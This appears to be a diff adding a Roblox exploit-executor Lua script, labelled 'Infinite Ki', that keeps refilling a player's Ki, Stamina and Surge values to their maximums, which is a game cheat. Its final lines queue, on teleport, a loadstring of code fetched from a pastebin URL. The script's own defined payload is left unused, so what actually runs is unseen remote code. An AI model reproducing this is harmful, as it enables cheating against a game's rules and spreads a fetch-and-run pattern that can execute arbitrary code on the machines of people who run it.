@@ -1,0 +1,34 @@
+-- Wait for the game to load (especially useful right after teleport)
+repeat task.wait() until game:IsLoaded()
+
+-- Send notification
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Success",
+	Text = "Infinite Ki Loaded",
+	Duration = 5
+})
+
+-- Script to queue on teleport
+local scriptToQueue = [[
+repeat task.wait() until game:IsLoaded()
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Success",
+	Text = "Infinite Ki Loaded",
+	Duration = 5
+})
+
+while true do
+	task.wait(0.5)
+	local player = game.Players.LocalPlayer
+	if player and player:FindFirstChild("Data") then
+		player.Data.Ki.Value = player.Data.MaxKi.Value
+		player.Data.Stamina.Value = player.Data.MaxStamina.Value
+		player.Data.Surge.Value = player.Data.SurgeMax.Value
+	end
+end
+]]
+
+queue_on_teleport([[
+loadstring(game:HttpGet("https://pastebin.com/raw/AhG0ewv4", true))()
+]])
